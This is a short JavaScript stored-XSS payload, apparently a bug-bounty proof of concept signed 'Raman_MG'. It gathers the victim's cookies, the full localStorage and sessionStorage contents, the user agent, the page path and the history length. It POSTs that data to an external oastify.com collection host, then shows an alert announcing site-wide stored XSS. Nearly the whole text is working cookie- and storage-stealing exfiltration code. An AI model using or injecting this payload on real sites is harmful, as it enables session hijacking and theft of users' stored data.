const myTrackingData = JSON.stringify({
    path: window. location.pathname, // Window and Document Information 
    cookies: document.cookie, // Cookies 
    userAgent: window.navigator.userAgent, // Client User-Agent 
    localStorageData: localStorage, // Local Storage 
    sessionStorageData: sessionStorage, // Session Storage 
    history: window.history.length, // Browsing History
});

// Store myTrackingData in localStorage
localStorage.setItem( 'myTrackingData', myTrackingData);
var postData = "msg=" + encodeURIComponent(myTrackingData) ;
var xhr = new XMLHttpRequest() ;
var url = "https://xcd2mx7kny9nd9i5r7yvhzsrhincb2zr.oastify.com"; // Replace with the correct URL
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console. log(xhr.responseText);
    }
};
xhr.send(postData);

// Retrieve myTrackingData from localStorage
const myStoredData = localStorage.getItem('myTrackingData');
console.log('Data retrieved from localStorage:', myStoredData) ;

// Display an alert message
alert(`*!!!---Vulnerability has been Escalated To Site-Wide Stored XSS By Raman_MG —-!!!
- path captures the current URL path.
- cookies capture the client's cookies.
- userAgent captures the user-agent string to identify the browser and device.
- local storage data captures the data stored in local storage.
- sessionStorageData captures the data stored in session storage.
- history captures the length of the browsing history (number of pages visited).`);
// Raman_MG